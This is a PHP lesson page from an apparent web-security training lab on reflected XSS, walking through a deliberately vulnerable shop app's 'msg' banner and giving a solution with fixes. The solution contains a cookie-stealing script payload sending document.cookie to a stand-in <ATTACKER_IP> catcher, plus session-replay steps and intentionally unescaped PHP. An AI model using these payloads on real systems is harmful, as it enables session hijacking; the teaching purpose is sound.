<?php
require __DIR__ . '/_layout.php';

$lessons = require_once __DIR__ . '/lessons.php';
$lesson  = $lessons['xss-reflected'];

academy_layout_start($lesson['title']);
?>

<header class="academy-lesson-head">
    <div class="academy-lesson-eyebrow"><?= htmlspecialchars($lesson['category']) ?> &middot; Lab 04</div>
    <h1><?= htmlspecialchars($lesson['title']) ?></h1>
    <div class="academy-lesson-meta">
        <span class="academy-badge is-medium"><?= htmlspecialchars($lesson['difficulty']) ?></span>
        <span class="academy-badge is-ready">Ready</span>
    </div>
</header>

<?php academy_render_related_labs('xss-reflected'); ?>

<!-- 1. THEORY -->
<section class="academy-block">
    <h2>1. Theory</h2>

    <h3>What is XSS?</h3>
    <p>
        <strong>XSS</strong> stands for <strong>Cross-Site Scripting</strong>. It happens
        when a website accidentally lets an attacker inject their own JavaScript into a
        page that another user is viewing. The victim&apos;s browser sees that script
        as part of the trusted website &mdash; so it runs with full access to the
        victim&apos;s cookies, session, and anything the user can see or do on the
        site. In practical terms, a successful XSS often means the attacker can read
        the victim&apos;s session cookie and log in as them.
    </p>
    <p>
        There are three common flavours of XSS, and the difference is just
        <em>where the payload lives</em>:
    </p>
    <ul>
        <li><strong>Reflected XSS</strong> &mdash; the payload sits in a link the
            attacker sends the victim. The server echoes it back into the page, and the
            victim&apos;s browser executes it.</li>
        <li><strong>Stored XSS</strong> &mdash; the payload is saved on the server
            (e.g. in a product review) and served to every later visitor. No crafted
            link needed.</li>
        <li><strong>DOM-based XSS</strong> &mdash; the payload never touches the
            server at all. It lives in a part of the URL the browser keeps to itself,
            and the page&apos;s own JavaScript is what puts it into the page.</li>
    </ul>
    <p class="academy-callout">
        This lab covers <strong>reflected XSS</strong>. The other two variants have
        their own labs: <a href="xss-stored.php">Stored XSS</a> and
        <a href="xss-dom.php">DOM-based XSS</a>. Each lab is self-contained - no
        particular order is required.
    </p>

    <h3>How reflected XSS works</h3>
    <p>
        <strong>Reflected XSS</strong> happens when the server echoes attacker-controlled
        input directly into the HTML response without escaping it. The payload is not
        stored anywhere on the server - instead, the attacker delivers it inside a URL,
        tricks the victim into clicking, and the victim&apos;s own browser executes the
        injected JavaScript inside the application&apos;s origin.
    </p>
    <p>
        Because the payload lives in the URL, exploitation is a two-part operation: a
        <strong>malicious link</strong> the victim must follow, and a
        <strong>catcher</strong> on a server we control that records the stolen data.
    </p>
</section>

<!-- 2. TASK 1 - FIND THE REFLECTED SINK -->
<section class="academy-block">
    <h2>2. Task 1 - find the reflected sink</h2>
    <p>
        Browse the application and find a URL parameter (a query-string value) whose
        contents are printed back into the response unescaped. Reflected XSS only lives
        wherever user-controlled input appears in the page that rendered it, so look for
        inputs that show up immediately in the response - banners, search results,
        error messages, notifications.
    </p>
    <details class="academy-hint">
        <summary>Reveal the reflected sink</summary>
        <p>
            The home page has a notification banner that ingests the <code>msg</code>
            query parameter and prints it unescaped:
        </p>
        <pre><code>// home.php
header("X-XSS-Protection: 0");   // explicitly turns off the browser&apos;s legacy filter

...

if (isset($_GET['msg'])) {
    echo "Notification: " . $_GET['msg']; // XSS VULNERABILITY
} else {
    echo "Welcome back to Anan Super Market!";
}</code></pre>
        <p>Two things make this lethal:</p>
        <ol>
            <li>The page already requires a session, so anyone who is tricked into
                clicking the link is logged in. The session cookie isn&apos;t marked
                <code>HttpOnly</code>, so <code>document.cookie</code> hands a usable
                <code>PHPSESSID</code> straight to injected JavaScript.</li>
            <li><code>X-XSS-Protection: 0</code> disables the (already-dead) browser-side
                XSS filter, so injected <code>&lt;script&gt;</code> tags execute without
                interference.</li>
        </ol>
    </details>
</section>

<!-- 3. TASK 2 - EXPLOIT THE REFLECTED SINK -->
<section class="academy-block">
    <h2>3. Task 2 - exploit the reflected sink</h2>
    <ol>
        <li>Use the reflected sink on <code>home.php</code> and prove you can inject
            arbitrary HTML/JS (start with <code>alert(1)</code>).</li>
        <li>Make the injected JS read <code>document.cookie</code>, base64-encode it, and
            ship it to <code>AttackerServer/catcher.php</code> on a host you control.</li>
        <li>Confirm the catcher writes the cookie to
            <code>AttackerServer/stolen_cookies.txt</code>.</li>
        <li>
            <strong>Goal:</strong> harvest a victim&apos;s <code>PHPSESSID</code> and use
            it from a different browser to authenticate as them with no password.
        </li>
    </ol>
    <p>
        Treat the &quot;victim&quot; as a second logged-in browser session you open
        yourself, on the same machine or another machine on your LAN.
    </p>
</section>

<!-- 4. START THE LAB -->
<section class="academy-block">
    <h2>4. Start the lab</h2>
    <p>
        Make sure you are already logged in on the target browser (e.g. as
        <code>carlos</code> / <code>1234</code>), then click the link below. The
        reflected sink is <code>home.php?msg=...</code>.
    </p>
    <a class="academy-lab-cta"
       href="<?= htmlspecialchars($lesson['target_url']) ?>"
       target="_blank" rel="noopener">Open vulnerable home page</a>
</section>

<!-- 5. REVEAL SOLUTION -->
<details class="academy-solution" id="academy-solution">
    <summary>Reveal solution (spoilers!)</summary>
    <div class="academy-solution-body">
        <p class="academy-solution-warning">
            Try the lab on your own first. Reading the solution before attempting it
            yourself defeats the point of the exercise.
        </p>

        <h3>Step 1 - prove the sink</h3>
        <p>Open this URL in a logged-in browser:</p>
        <pre><code>http://localhost/CyberProject/home.php?msg=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
        <p>You get a browser alert. The notification banner now reads
            &quot;Notification: &quot; followed by your injected DOM.</p>

        <h3>Step 2 - weaponise it</h3>
        <p>
            We want the victim&apos;s cookie sent to our server. <code>btoa()</code> turns
            the cookie string into base64 (avoids URL-encoding headaches), and
            <code>document.location</code> performs a top-level navigation that triggers a
            simple <code>GET</code> request the catcher logs:
        </p>
        <pre><code>&lt;script&gt;
document.location =
    'http://&lt;ATTACKER_IP&gt;/CyberProject/AttackerServer/catcher.php?data='
    + btoa(document.cookie);
&lt;/script&gt;</code></pre>

        <h3>Step 3 - URL-encode and ship</h3>
        <p>
            Wrap the payload in <code>urllib.parse.quote()</code> and concatenate it onto
            <code>home.php?msg=</code>. The resulting URL is what you send to the victim
            (email, chat, …).
        </p>

        <h3>Step 4 - the catcher</h3>
        <p>
            On the attacker server, <code>catcher.php</code> reads the <code>data</code>
            query parameter, base64-decodes it, and appends it to
            <code>stolen_cookies.txt</code>. It also renders a convincing
            &quot;Coupon Applied!&quot; page so the victim doesn&apos;t immediately
            realise anything went wrong.
        </p>
        <details style="margin-top: 1rem;">
            <summary style="cursor: pointer; font-weight: 600;">View catcher.php</summary>
            <div class="academy-script" style="margin-top: 0.75rem;">
                <?php highlight_file(__DIR__ . '/../AttackerServer/catcher.php'); ?>
            </div>
        </details>

        <h3>Step 5 - replay the cookie</h3>
        <p>
            With the stolen <code>PHPSESSID</code>, open the site in a different browser
            (or incognito window), set the cookie via DevTools, and refresh
            <code>home.php</code>. You are now logged in as the victim.
        </p>

        <details style="margin-top: 1rem;">
            <summary style="cursor: pointer; font-weight: 600;">Bonus: automated exploit</summary>
            <p style="margin-top: 0.75rem;">This script just builds the URL - there is nothing else to automate, because
                actual exploitation requires a human to click. You would normally run the
                catcher on a server you control on the same network.</p>
            <div class="academy-script">
                <?php highlight_file(__DIR__ . '/../scripts/Reflected_XSS_Attack_Link_Builder.py'); ?>
            </div>
        </details>

        <h3>How to fix it (for context)</h3>
        <ul>
            <li>Always escape on output:
                <code>echo "Notification: " . htmlspecialchars($_GET['msg']);</code></li>
            <li>Remove <code>X-XSS-Protection: 0</code>. Modern browsers ignore the header
                anyway, but explicitly disabling it makes static analysis treat the file as
                hostile.</li>
            <li>Mark session cookies <code>HttpOnly</code>; even if JS injection succeeds,
                <code>document.cookie</code> will not contain the session.</li>
            <li>Add a Content Security Policy that forbids inline scripts and unknown
                origins.</li>
        </ul>
    </div>
</details>

<script>
(function () {
    var details = document.getElementById('academy-solution');
    if (!details) return;
    details.addEventListener('toggle', function () {
        if (this.open && !this.dataset.confirmed) {
            var ok = confirm('Are you sure you want to see the solution?\n\nTry the lab first - that is where the learning happens.');
            if (!ok) { this.open = false; } else { this.dataset.confirmed = '1'; }
        }
    });
})();
</script>

<p style="margin-top: 28px;">
    <a href="index.php">&larr; Back to all labs</a>
</p>

<?php
academy_layout_end();
